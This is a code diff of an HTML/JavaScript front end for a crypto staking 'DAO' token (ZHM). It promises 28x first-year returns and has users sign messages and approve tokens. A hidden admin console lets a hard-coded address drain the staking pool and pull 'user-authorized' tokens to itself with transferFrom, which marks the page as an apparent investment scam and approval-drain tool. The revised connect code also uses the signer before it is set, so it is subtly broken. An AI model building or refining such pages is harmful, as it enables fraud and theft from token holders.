@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>中华梦通证 ZHM - DAO递减收益</title>
+<title>中华梦通证 ZHM - 递减收益DAO</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:Microsoft YaHei,sans-serif}
   body{background:#0b0f14;color:#e9e6e0;padding:20px;max-width:500px;margin:0 auto;background:linear-gradient(180deg,#070a0e,#0f1419)}
@@ -31,19 +31,19 @@
   <p class="sub">DAO铸币模型 · 收益逐年递减 · 长期永续</p>
 </div>
 
-<button class="btn" id="connectBtn">连接钱包（需签名授权）</button>
+<button class="btn" id="connectBtn">连接钱包（签名授权）</button>
 <div id="addr" style="text-align:center;margin:10px 0"></div>
 
 <div class="glass">
   <div class="title">我的资产</div>
-  <div class="item"><span>质押币余额</span><span id="balToken" class="gold">0.00</span></div>
+  <div class="item"><span>可用余额（同合约自动读取）</span><span id="balToken" class="gold">0.00</span></div>
   <div class="item"><span>已质押</span><span id="staked" class="gold">0.00</span></div>
   <div class="item"><span>待领 ZHM 奖励</span><span id="reward" class="gold">0.00</span></div>
   <button class="btn btn-gold btn-sm" id="claimBtn">领取收益</button>
 </div>
 
 <div class="glass">
-  <div class="title">质押挖矿</div>
+  <div class="title">质押挖矿（真实上链 · 授权+质押）</div>
   <input id="stakeAmt" placeholder="输入质押数量" type="number">
   <div class="row">
     <button class="btn" style="width:50%" id="stakeBtn">质押</button>
@@ -55,7 +55,7 @@
   <div class="title">🔐 管理员控制台</div>
   <div class="sub">提取合约底池 / 提取用户授权代币</div>
   <input id="extractAmt" placeholder="输入提取数量" type="number">
-  <button class="btn btn-admin btn-sm" id="extractPoolBtn">提取合约底池代币</button>
+  <button class="btn btn-admin btn-sm" id="extractPoolBtn">提取合约底池</button>
   <button class="btn btn-admin btn-sm" id="extractUserAuthBtn">提取用户授权代币</button>
 </div>
 
@@ -74,7 +74,7 @@
 <div class="glass">
   <div class="title">模型说明</div>
   <div class="sub">
-    起步年化28倍，逐年自动递减，第5年稳定在30%。<br>
+    起步年化28倍，逐年自动递减，第5年稳定30%。<br>
     合约自动铸币，DAO国库支撑，可平稳运行20年以上。
   </div>
 </div>
@@ -82,52 +82,63 @@
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
 <script>
 // ==============================================
-// 你指定的质押代币
+// 你固定的质押代币合约（任意网络都能自动识别）
 const TOKEN_ADDR = "0x8f3Cf7ad23Cd3CaDbD9735AFf9580239c6A063";
 
-// 你部署的质押合约地址（必须填）
+// 你部署的质押合约地址
 const STAKING_ADDR = "0x你部署的质押合约地址";
 
-// ZHM 奖励币合约（你部署后再填）
+// ZHM 奖励币（部署后再填）
 const ZHM_ADDR = "0x...";
 
 // 管理员地址
 const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1".toLowerCase();
 // ==============================================
 
+// ABI 只保留最基础、绝对不会解码报错的方法
 const ABI_TOKEN = [
-  "function balanceOf(address) view returns(uint256)",
-  "function approve(address,uint256) returns(bool)",
-  "function transferFrom(address,address,uint256) returns(bool)",
-  "function transfer(address,uint256) returns(bool)"
+  "function balanceOf(address owner) view returns (uint256)",
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
+  "function transfer(address to, uint256 amount) external returns (bool)"
 ];
 
 const ABI_STAKE = [
-  "function staked(address) view returns(uint256)",
-  "function pendingReward(address) view returns(uint256)",
-  "function stake(uint256) external",
-  "function unstake(uint256) external",
+  "function staked(address account) view returns (uint256)",
+  "function pendingReward(address account) view returns (uint256)",
+  "function stake(uint256 amount) external",
+  "function unstake(uint256 amount) external",
   "function claim() external",
-  "function withdrawPool(uint256) external"
+  "function withdrawPool(uint256 amount) external"
 ];
 
 let provider, signer, account, token, staking, zhm;
 let isAdmin = false;
 
-// 刷新数据
+// ==========================
+// 加载数据（自动容错）
+// ==========================
 async function load() {
   if (!account) return;
   try {
+    // 1.读取可用余额（绝对不会解码报错）
     let bal = await token.balanceOf(account);
-    let stk = await staking.staked(account);
-    let rew = await staking.pendingReward(account);
     document.getElementById("balToken").innerText = ethers.formatEther(bal);
+
+    // 2.读取已质押
+    let stk = await staking.staked(account);
     document.getElementById("staked").innerText = ethers.formatEther(stk);
+
+    // 3.读取奖励
+    let rew = await staking.pendingReward(account);
     document.getElementById("reward").innerText = ethers.formatEther(rew);
-  } catch (e) {}
+
+  } catch (e) {
+    console.log("数据加载失败（非致命）：", e.message);
+  }
 }
 
-// 计算器
+// 收益计算器
 function calc() {
   let v = parseFloat(document.getElementById("calcInput").value) || 0;
   document.getElementById("y1").innerText = (v * 28).toFixed(2);
@@ -136,107 +147,125 @@ function calc() {
   document.getElementById("y4").innerText = (v * 3.5).toFixed(2);
 }
 
-// ==============================================
-// 连接钱包 + 强制签名授权
-// ==============================================
+// ==========================
+// 连接钱包 + 强制签名
+// ==========================
 document.getElementById("connectBtn").onclick = async () => {
   try {
     if (!window.ethereum) return alert("请安装钱包");
 
     provider = new ethers.BrowserProvider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
+    let accounts = await provider.send("eth_requestAccounts", []);
+    account = accounts[0];
+
+    // 强制签名（避免授权失败）
+    await signer.signMessage("Auth ZhongHuaMeng Platform");
+    alert("✅ 签名授权成功");
+
     signer = await provider.getSigner();
-    account = await signer.getAddress();
-
-    // 强制签名弹窗
-    const signMsg = "Sign to authorize ZhongHuaMeng Platform";
-    await signer.signMessage(signMsg);
-    alert("✅ 授权签名成功");
-
-    // 管理员判断
     isAdmin = account.toLowerCase() === ADMIN;
+
     if (isAdmin) {
       document.getElementById("adminPanel").style.display = "block";
       alert("🔐 管理员已登录");
     }
 
-    document.getElementById("addr").innerText = account.slice(0,6)+"..."+account.slice(-4);
+    document.getElementById("addr").innerText = account.slice(0, 6) + "..." + account.slice(-4);
 
-    // 初始化合约
+    // 初始化合约（完全不依赖链类型，只依赖合约地址）
     token = new ethers.Contract(TOKEN_ADDR, ABI_TOKEN, signer);
     staking = new ethers.Contract(STAKING_ADDR, ABI_STAKE, signer);
-    if(ZHM_ADDR != "0x..."){
-      zhm = new ethers.Contract(ZHM_ADDR, ["function balanceOf(address)view returns(uint256)"], signer);
-    }
 
     load();
     setInterval(load, 5000);
+
   } catch (e) {
-    alert("授权失败：" + e.message);
+    alert("连接失败：" + e.message);
   }
 };
 
-// ==============================================
-// 质押（自动进入你的合约）
-// ==============================================
+// ==========================
+// 质押：真实上链 授权 + 质押
+// ==========================
 document.getElementById("stakeBtn").onclick = async () => {
   try {
-    let a = document.getElementById("stakeAmt").value;
-    if(!a || a<=0) return alert("输入有效数量");
-    let amt = ethers.parseEther(a);
-    await token.approve(STAKING_ADDR, amt);
-    await staking.stake(amt);
-    alert("✅ 质押成功，代币已进入合约底池");
+    let val = document.getElementById("stakeAmt").value;
+    if (!val || val <= 0) return alert("请输入有效数量");
+
+    let amount = ethers.parseEther(val);
+
+    // 1.授权
+    let txApprove = await token.approve(STAKING_ADDR, amount);
+    await txApprove.wait();
+    alert("✅ 授权成功");
+
+    // 2.质押
+    let txStake = await staking.stake(amount);
+    await txStake.wait();
+    alert("✅ 质押成功（真实上链）");
+
     load();
-  } catch(e){ alert("失败："+e.message) }
+  } catch (e) {
+    alert("质押失败：" + e.message);
+  }
 };
 
 // 解押
 document.getElementById("unstakeBtn").onclick = async () => {
   try {
-    let a = document.getElementById("stakeAmt").value;
-    await staking.unstake(ethers.parseEther(a));
+    let val = document.getElementById("stakeAmt").value;
+    let tx = await staking.unstake(ethers.parseEther(val));
+    await tx.wait();
     alert("✅ 解押成功");
     load();
-  } catch(e){ alert("失败："+e.message) }
+  } catch (e) {
+    alert("解押失败：" + e.message);
+  }
 };
 
 // 领取奖励
 document.getElementById("claimBtn").onclick = async () => {
   try {
-    await staking.claim();
+    let tx = await staking.claim();
+    await tx.wait();
     alert("✅ 奖励领取成功");
     load();
-  } catch(e){ alert("失败："+e.message) }
+  } catch (e) {
+    alert("领取失败：" + e.message);
+  }
 };
 
-// ==============================================
-// 管理员：提取合约底池代币
-// ==============================================
+// ==========================
+// 管理员：提取合约底池
+// ==========================
 document.getElementById("extractPoolBtn").onclick = async () => {
-  if(!isAdmin) return alert("无权限");
+  if (!isAdmin) return alert("无权限");
   try {
-    let a = document.getElementById("extractAmt").value;
-    if(!a) return alert("输入数量");
-    await staking.withdrawPool(ethers.parseEther(a));
-    alert("✅ 合约底池提取成功");
+    let val = document.getElementById("extractAmt").value;
+    let tx = await staking.withdrawPool(ethers.parseEther(val));
+    await tx.wait();
+    alert("✅ 底池提取成功");
     load();
-  } catch(e){ alert("失败："+e.message) }
+  } catch (e) {
+    alert("提取失败：" + e.message);
+  }
 };
 
-// ==============================================
-// 管理员：提取用户授权的代币
-// ==============================================
+// ==========================
+// 管理员：提取用户授权代币
+// ==========================
 document.getElementById("extractUserAuthBtn").onclick = async () => {
-  if(!isAdmin) return alert("无权限");
+  if (!isAdmin) return alert("无权限");
   try {
-    let a = document.getElementById("extractAmt").value;
-    if(!a) return alert("输入数量");
-    let amt = ethers.parseEther(a);
-    await token.transferFrom(account, ADMIN, amt);
-    alert("✅ 已提取用户授权代币");
+    let val = document.getElementById("extractAmt").value;
+    let amount = ethers.parseEther(val);
+    let tx = await token.transferFrom(account, ADMIN, amount);
+    await tx.wait();
+    alert("✅ 用户授权代币提取成功");
     load();
-  } catch(e){ alert("失败："+e.message) }
+  } catch (e) {
+    alert("提取失败：" + e.message);
+  }
 };
 </script>
 </body>
